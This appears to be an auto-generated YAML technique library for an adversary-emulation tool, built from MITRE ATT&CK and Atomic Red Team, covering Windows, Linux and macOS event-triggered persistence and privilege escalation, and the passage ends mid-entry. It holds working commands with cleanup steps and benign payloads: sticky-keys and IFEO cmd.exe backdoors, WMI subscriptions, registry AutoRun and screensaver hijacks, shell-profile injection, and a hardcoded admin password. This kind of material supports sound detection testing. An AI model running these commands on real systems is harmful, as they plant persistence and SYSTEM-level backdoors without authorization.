# AutoStrike MITRE ATT&CK Techniques - privilege-escalation
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1546
  name: Event Triggered Execution
  description: |-
    Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.[1](https://medium.com/daniel-grzelak/backdooring-an-aws-account-da007d36f8f9)[2](https://www.varonis.com/blog/power-automate-data-exfiltration)[3](https://www.microsoft.com/security/blog/2020/03/09/real-life-cybercrime-stories-dart-microsoft-detection-and-response-team)

    Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.[4](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf)[5](https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf)[6](https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/)

    Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Persistence with Custom AutodialDLL
      type: powershell
      platform: windows
      command: Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll
      cleanup: Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value  $env:windir\system32\rasadhlp.dll
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: HKLM - Persistence using CommandProcessor AutoRun key (With Elevation)
      type: powershell
      platform: windows
      command: New-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value "notepad.exe" -PropertyType "String"
      cleanup: Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation)
      type: powershell
      platform: windows
      command: |-
        $path = "HKCU:\Software\Microsoft\Command Processor"
        if (!(Test-Path -path $path)){
          New-Item -ItemType Key -Path $path
        }
        New-ItemProperty -Path $path -Name "AutoRun" -Value "notepad.exe" -PropertyType "String"
      cleanup: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Command Processor" -Name "AutoRun" -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: WMI Invoke-CimMethod Start Process
      type: powershell
      platform: windows
      command: |-
        # Set the remote computer name and credentials
         $RemoteComputer = "localhost"
         $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
         $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword

         # Create a CIM session
         $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential

         # Define the process you want to start
         $ProcessToStart = "calc.exe"

         # Invoke the Create method on the Win32_Process class to start the process
         $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

         # Check the result
         if ($Result.ReturnValue -eq 0) {
             Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
         } else {
             Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
         }

         # Clean up the CIM session
         Remove-CimSession -CimSession $CimSession
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Adding custom debugger for Windows Error Reporting
      type: cmd
      platform: windows
      command: reg add "HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs" /v Debugger /t REG_SZ /d "C:\Windows\System32\notepad.exe" /f
      cleanup: reg delete "HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs" /v Debugger /f
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Load custom DLL on mstsc execution
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Microsoft\Terminal Server Client" /v ClxDllPath /t REG_SZ /d "C:\Windows\System32\amsi.dll" /f
      cleanup: reg delete "HKLM\SOFTWARE\Microsoft\Terminal Server Client" /v ClxDllPath /f
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Persistence using automatic execution of custom DLL during RDP session
      type: cmd
      platform: windows
      command: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\TestDVCPlugin" /v Path /t REG_SZ /d "C:\Windows\System32\amsi.dll" /f
      cleanup: reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\TestDVCPlugin" /f
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Persistence via ErrorHandler.cmd script execution
      type: powershell
      platform: windows
      command: |-
        Copy-Item -Path PathToAtomicsFolder\T1546\src\ErrorHandler.cmd -Destination C:\Windows\Setup\Scripts\ErrorHandler.cmd
        C:\windows\System32\oobe\Setup
      cleanup: Remove-Item C:\Windows\Setup\Scripts\ErrorHandler.cmd
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Persistence using STARTUP-PATH in MS-WORD
      type: cmd
      platform: windows
      command: reg add "HKCU\Software\Microsoft\Office\16.0\Word\Options" /v STARTUP-PATH /t REG_SZ /d "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent" /f
      cleanup: reg delete HKCU\Software\Microsoft\Office\16.0\Word\Options /v STARTUP-PATH /f
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1546
  is_safe: true
- id: T1546.001
  name: Change Default File Association
  description: "Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.[1](https://support.microsoft.com/en-us/help/18539/windows-7-change-default-programs)[2](https://learn.microsoft.com/en-us/previous-versions/visualstudio/visual-studio-2015/extensibility/specifying-file-handlers-for-file-name-extensions?view=vs-2015)[3](https://docs.microsoft.com/windows-server/administration/windows-commands/assoc) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n\nSystem file associations are listed under <code>HKEY_CLASSES_ROOT\\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command</code>. For example: \n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.[4](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_fakeav.gzd)"
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Change Default File Association
      type: cmd
      platform: windows
      command: assoc .hta=txtfile
      cleanup: assoc  .hta=htafile
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1546/001
  is_safe: false
- id: T1546.002
  name: Screensaver
  description: |-
    Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.[1](https://en.wikipedia.org/wiki/Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\Windows\System32\</code>, and <code>C:\Windows\sysWOW64\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.

    The following screensaver settings are stored in the Registry (<code>HKCU\Control Panel\Desktop\</code>) and could be manipulated to achieve persistence:

    * <code>SCRNSAVE.exe</code> - set to malicious PE path
    * <code>ScreenSaveActive</code> - set to '1' to enable the screensaver
    * <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock
    * <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed

    Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.[2](https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf)
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Set Arbitrary Binary as Screensaver
      type: cmd
      platform: windows
      command: |-
        reg export "HKEY_CURRENT_USER\Control Panel\Desktop" %userprofile%\backup.reg
        copy C:\Windows\System32\cmd.exe "%SystemRoot%\System32\evilscreensaver.scr"
        reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
        reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f
        reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
        reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
        if 0 NEQ 0 shutdown /r /t 0
      cleanup: |-
        reg import %userprofile%\backup.reg
        del %userprofile%\backup.reg
        del %SystemRoot%\System32\evilscreensaver.scr
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1546/002
  is_safe: false
- id: T1546.003
  name: Windows Management Instrumentation Event Subscription
  description: |-
    Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.[1](https://web.archive.org/web/20160629094859/https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf)

    Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.[2](https://web.archive.org/web/20221203203722/https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf)[3](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf) Adversaries may also compile WMI scripts – using `mofcomp.exe`  –into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.[4](https://www.secureworks.com/blog/wmi-persistence)[5](https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-)

    WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Persistence via WMI Event Subscription - CommandLineEventConsumer
      type: powershell
      platform: windows
      command: |-
        $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';
                        EventNameSpace='root\CimV2';
                        QueryLanguage="WQL";
                        Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
        $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

        $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';
                        CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}
        $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

        $FilterToConsumerArgs = @{
        Filter = [Ref] $Filter;
        Consumer = [Ref] $Consumer;
        }
        $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
      cleanup: |-
        $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'"
        $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'"
        $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
        $FilterConsumerBindingToCleanup | Remove-WmiObject
        $EventConsumerToCleanup | Remove-WmiObject
        $EventFilterToCleanup | Remove-WmiObject
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Persistence via WMI Event Subscription - ActiveScriptEventConsumer
      type: powershell
      platform: windows
      command: |-
        $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                        EventNameSpace='root\CimV2';
                        QueryLanguage="WQL";
                        Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
        $Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs

        $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                        ScriptingEngine='VBScript';
                        ScriptText='
                        Set objws = CreateObject("Wscript.Shell")
                        objws.Run "notepad.exe", 0, True
                        '}
        $Consumer=Set-WmiInstance -Namespace "root\subscription" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs

        $FilterToConsumerArgs = @{
        Filter = $Filter;
        Consumer = $Consumer;
        }
        $FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs
      cleanup: |-
        $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'"
        $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'"
        $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
        $FilterConsumerBindingToCleanup | Remove-WmiObject
        $EventConsumerToCleanup | Remove-WmiObject
        $EventFilterToCleanup | Remove-WmiObject
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Windows MOFComp.exe Load MOF File
      type: powershell
      platform: windows
      command: c:\windows\system32\wbem\mofcomp.exe "PathToAtomicsFolder\T1546.003\src\T1546.003.mof"
      cleanup: |-
        $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam_consumer'"
        $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam_filter'"
        $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
        $FilterConsumerBindingToCleanup | Remove-WmiObject
        $EventConsumerToCleanup | Remove-WmiObject
        $EventFilterToCleanup | Remove-WmiObject
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1546/003
  is_safe: true
- id: T1546.004
  name: Unix Shell Configuration Modification
  description: "Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user’s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files.[1](https://www.intezer.com/blog/research/kaiji-new-chinese-linux-malware-turning-to-golang/)[2](https://web.archive.org/web/20220316014323/http://bencane.com/2013/09/16/understanding-a-little-more-about-etcprofile-and-etcbashrc/) These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely.[3](https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect)[4](https://wiki.archlinux.org/index.php/Bash#Invocation) Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.[5](https://unit42.paloaltonetworks.com/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/)[3](https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect)[6](https://www.anomali.com/blog/pulling-linux-rabbit-rabbot-malware-out-of-a-hat)[7](https://blog.sucuri.net/2018/05/shell-logins-as-a-magento-reinfection-vector.html) Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session. \n\nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>.[8](https://scriptingosx.com/2019/06/moving-to-zsh-part-2-configuration-files/)[9](https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5)[10](https://github.com/D00MFist/PersistentJXA/blob/master/BashProfilePersist.js)[11](https://cedowens.medium.com/macos-ms-office-sandbox-brain-dump-4509b5fed49a) The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup."
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - linux
    - macos
  executors:
    - name: Add command to .bash_profile
      type: sh
      platform: macos
      command: echo 'echo "Hello from Atomic Red Team T1546.004" > /tmp/T1546.004' >> ~/.bash_profile
      cleanup: |-
        head -n '-2' ~/.bash_profile > /tmp/T1546.004
        mv /tmp/T1546.004 ~/.bash_profile
      timeout: 60
      is_safe: true
    - name: Add command to .bash_profile
      type: sh
      platform: linux
      command: echo 'echo "Hello from Atomic Red Team T1546.004" > /tmp/T1546.004' >> ~/.bash_profile
      cleanup: |-
        head -n '-2' ~/.bash_profile > /tmp/T1546.004
        mv /tmp/T1546.004 ~/.bash_profile
      timeout: 60
      is_safe: true
    - name: Add command to .bashrc
      type: sh
      platform: macos
      command: echo 'echo "Hello from Atomic Red Team T1546.004" > /tmp/T1546.004' >> ~/.bashrc
      cleanup: |-
        head -n '-2' ~/.bashrc > /tmp/T1546.004
        mv /tmp/T1546.004 ~/.bashrc
      timeout: 60
      is_safe: true
    - name: Add command to .bashrc
      type: sh
      platform: linux
      command: echo 'echo "Hello from Atomic Red Team T1546.004" > /tmp/T1546.004' >> ~/.bashrc
      cleanup: |-
        head -n '-2' ~/.bashrc > /tmp/T1546.004
        mv /tmp/T1546.004 ~/.bashrc
      timeout: 60
      is_safe: true
    - name: Add command to .shrc
      type: sh
      platform: linux
      command: echo 'echo "Hello from Atomic Red Team T1546.004" > /tmp/T1546.004' >> ~/.shrc
      cleanup: |-
        head -n '-2' ~/.shrc > /tmp/T1546.004
        mv /tmp/T1546.004 ~/.shrc
      timeout: 60
      is_safe: true
    - name: Append to the system shell profile
      type: sh
      platform: linux
      command: echo '# Hello from Atomic Red Team T1546.004' >> /etc/profile
      cleanup: sed -i "s/# Atomic Red Team was here! T1546.004//" /etc/profile
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Append commands user shell profile
      type: sh
      platform: linux
      command: echo '# Atomic Red Team was here... T1546.004' >> ~/.profile
      cleanup: sed -i "s/# Atomic Red Team was here... T1546.004//" ~/.profile
      timeout: 60
      is_safe: true
    - name: System shell profile scripts
      type: sh
      platform: linux
      command: echo '# Atomic Red Team was here... T1546.004' >> /etc/profile.d/bash_completion.sh
      cleanup: sed -i "s/# Atomic Red Team was here... T1546.004//" /etc/profile.d/bash_completion.sh
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Create/Append to .bash_logout
      type: bash
      platform: linux
      command: |-
        useradd --create-home --shell /bin/bash art
        su -l art -c "echo 'echo \"Atomic Red Team was here... T1546.004\" >> /home/art/art.txt' >> /home/art/.bash_logout; exit"
      cleanup: userdel -fr art
      timeout: 60
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1546/004
  is_safe: true
- id: T1546.005
  name: Trap
  description: |-
    Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.

    Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where "command list" will be executed when "signals" are received.[1](https://ss64.com/bash/trap.html)[2](https://bash.cyberciti.biz/guide/Trap_statement)
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - macos
    - linux
  executors:
    - name: Trap EXIT
      type: sh
      platform: macos
      command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" EXIT'
      cleanup: rm -f /tmp/art-fish.txt
      timeout: 60
      is_safe: true
    - name: Trap EXIT
      type: sh
      platform: linux
      command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" EXIT'
      cleanup: rm -f /tmp/art-fish.txt
      timeout: 60
      is_safe: true
    - name: Trap EXIT (freebsd)
      type: sh
      platform: linux
      command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" EXIT'
      cleanup: rm -f /tmp/art-fish.txt
      timeout: 60
      is_safe: true
    - name: Trap SIGINT
      type: sh
      platform: macos
      command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" SIGINT && kill -SIGINT $$'
      cleanup: rm -f /tmp/art-fish.txt
      timeout: 60
      is_safe: true
    - name: Trap SIGINT
      type: sh
      platform: linux
      command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" SIGINT && kill -SIGINT $$'
      cleanup: rm -f /tmp/art-fish.txt
      timeout: 60
      is_safe: true
    - name: Trap SIGINT (freebsd)
      type: sh
      platform: linux
      command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" SIGINT && kill -SIGINT $$'
      cleanup: rm -f /tmp/art-fish.txt
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1546/005
  is_safe: true
- id: T1546.007
  name: Netsh Helper DLL
  description: |-
    Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.[1](https://technet.microsoft.com/library/bb490939.aspx) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\SOFTWARE\Microsoft\Netsh</code>.

    Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.[2](https://github.com/outflankbv/NetshHelperBeacon)[3](https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html)
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Netsh Helper DLL Registration
      type: cmd
      platform: windows
      command: |-
        netsh.exe add helper "PathToAtomicsFolder\T1546.007\bin\NetshHelper.dll"
        taskkill /im notepad.exe /t /f > NUL 2>&1
      cleanup: netsh.exe delete helper "PathToAtomicsFolder\T1546.007\bin\NetshHelper.dll"
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1546/007
  is_safe: false
- id: T1546.008
  name: Accessibility Features
  description: |-
    Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

    Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen. [1](https://web.archive.org/web/20190216180458/https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html)

    Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). [2](https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.

    For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. [3](https://web.archive.org/web/20200730053039/https://www.crowdstrike.com/blog/registry-analysis-with-crowdresponse/)

    Other accessibility features exist that may also be leveraged in a similar fashion: [2](https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom)[4](https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html)

    * On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
    * Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
    * Narrator: <code>C:\Windows\System32\Narrator.exe</code>
    * Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
    * App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Attaches Command Prompt as a Debugger to a List of Target Processes
      type: powershell
      platform: windows
      command: |-
        $input_table = "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe".split(",")
        $Name = "Debugger"
        $Value = "C:\windows\system32\cmd.exe"
        Foreach ($item in $input_table){
          $item = $item.trim()
          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
          IF(!(Test-Path $registryPath))
          {
            New-Item -Path $registryPath -Force
            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
          }
          ELSE
          {
            New-ItemProperty -Path $registryPath -Name $name -Value $Value
          }
        }
      cleanup: |-
        $input_table = "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe".split(",")
        Foreach ($item in $input_table)
        {
          $item = $item.trim()
          reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f 2>&1 | Out-Null
        }
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Replace binary of sticky keys
      type: cmd
      platform: windows
      command: |-
        IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd )
        takeown /F C:\Windows\System32\sethc.exe /A
        icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
        copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
      cleanup: copy /Y C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Create Symbolic Link From osk.exe to cmd.exe
      type: cmd
      platform: windows
      command: |-
        IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd )
        takeown /F %windir%\System32\osk.exe /A
        icacls %windir%\System32\osk.exe /grant Administrators:F /t
        del %windir%\System32\osk.exe
        mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe
      cleanup: |-
        takeown /F %windir%\System32\osk.exe /A
        icacls %windir%\System32\osk.exe /grant Administrators:F /t
